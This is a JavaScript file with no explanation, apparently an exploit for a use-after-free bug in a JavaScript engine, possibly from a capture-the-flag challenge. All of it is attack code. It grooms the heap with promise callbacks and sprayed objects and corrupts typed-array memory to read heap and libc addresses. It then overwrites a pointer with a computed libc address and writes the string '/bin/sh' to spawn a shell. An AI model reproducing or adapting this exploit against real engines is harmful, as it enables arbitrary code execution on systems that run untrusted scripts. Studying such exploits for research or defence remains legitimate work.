var arr = new Uint32Array(0x140);
var str = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ";
var uaf_arr;
var objs;

async function fn1() {
	console.log("fn1");
	return arr;
}

async function fn2() {
	console.log("fn2");
	return str;
}

fn1().then(() => {
	fn1().then(() => {
		objs = [];
		for (let i = 0; i < 6; i++) {
			objs.push({a: 1});
		}

		uaf_arr = new Uint32Array(18);

		uaf_arr[0] = 10;
		uaf_arr[1] = 0x001b0d00;
		uaf_arr[0x10] = 0x10000000;

		fn2().then(() => {
			fn2().then(() => {
				for (let i = 0; i < 6; i++) {
					objs.push({a: 1});
				}

				var uaf_str_arr = new Uint32Array(18);

				uaf_str_arr[0] = 2;
				uaf_str_arr[1] = 0x10000000;
				uaf_str_arr[2] = 0x497f93b1;
				uaf_str_arr[3] = 0x4b;

				const read_dword = (offset) => {
					let result = 0;
					for (let i = 3; i >= 0; i--) {
						result = (result << 8) | str.charCodeAt(offset + i);
					}
					return result;
				};

				let heap_base_high = read_dword(0x54);
				let heap_base_low = read_dword(0x50) - 0xd60;
				console.log(heap_base_high.toString(16));
				console.log(heap_base_low.toString(16));

				uaf_arr[6] = heap_base_low + 0x200;
				uaf_arr[7] = heap_base_high;

				uaf_arr[0xe] = heap_base_low;
				uaf_arr[0xf] = heap_base_high;

				let libc_leak_low = read_dword(0x100);
				let libc_leak_high = read_dword(0x104);
				console.log(libc_leak_high.toString(16));
				console.log(libc_leak_low.toString(16));

				arr[0xa8] = libc_leak_low - 0x1a9a50;
				arr[0xa9] = libc_leak_high;

				arr[0xb0] = 0x6e69622f;
				arr[0xb1] = 0x0068732f;

				var x = {a: 1};
			});
		});
	});
});
